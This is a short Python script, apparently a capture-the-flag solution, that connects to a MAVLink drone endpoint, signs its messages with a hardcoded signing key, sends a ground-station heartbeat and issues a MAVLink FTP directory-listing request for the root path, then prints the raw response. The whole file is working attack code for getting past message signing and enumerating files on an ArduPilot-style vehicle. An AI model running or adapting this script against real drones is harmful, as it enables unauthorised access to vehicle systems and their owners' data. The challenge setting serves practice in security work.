#!/usr/bin/env python3

import os
import struct
import time

os.environ["MAVLINK20"] = "1"

from pymavlink import mavutil

HOST = "0.cloud.chals.io"
PORT = 33247

KEY = bytes.fromhex(
    "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
)

TARGET_SYS = 1
TARGET_COMP = 1

LIST_OPCODE = 3


def make_list_packet(path: str, seq: int = 0):

    hdr = struct.pack(
        "<HBBBBBBI",
        seq,                # sequence
        0,                  # session
        LIST_OPCODE,        # opcode
        len(path),          # data length
        0,                  # req_opcode
        0,                  # burst_complete
        0,                  # padding
        0                   # offset
    )

    return (hdr + path.encode()).ljust(251, b"\x00")


def main():

    print("[*] Connecting...")

    m = mavutil.mavlink_connection(
        f"tcp:{HOST}:{PORT}",
        dialect="ardupilotmega",
        source_system=255,
        source_component=190,
    )

    m.setup_signing(
        KEY,
        sign_outgoing=True,
        allow_unsigned_callback=lambda mav, msgid: True,
    )

    #
    # Received Telemetry
    #

    t0 = time.time()

    while time.time() - t0 < 2:
        m.recv_match(blocking=True, timeout=0.5)

    #
    # heartbeat sending
    #

    print("[*] Sending HEARTBEAT")

    m.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_GCS,
        mavutil.mavlink.MAV_AUTOPILOT_INVALID,
        0,
        0,
        0,
    )

    #
    # LIST "."
    #

    payload = make_list_packet("/")

    print("[*] Sending LIST '/'")

    m.mav.file_transfer_protocol_send(
        0,
        TARGET_SYS,
        TARGET_COMP,
        payload
    )

    #
    # Waiting response
    #

    print("[*] Waiting response...")

    while True:

        msg = m.recv_match(blocking=True, timeout=5)

        if msg is None:
            print("timeout")
            return

        if msg.get_type() != "FILE_TRANSFER_PROTOCOL":
            continue

        print()

        print("===== RAW FTP RESPONSE =====")

        raw = bytes(msg.payload)

        print(raw.hex())

        print()

        seq, session, opcode, size, req, burst, pad, offset = struct.unpack(
            "<HBBBBBBI",
            raw[:12]
        )

        print(f"seq      = {seq}")
        print(f"session  = {session}")
        print(f"opcode   = {opcode}")
        print(f"size     = {size}")
        print(f"req      = {req}")
        print(f"offset   = {offset}")

        print()

        print(raw[12:12+size])

        return


if __name__ == "__main__":
    main()
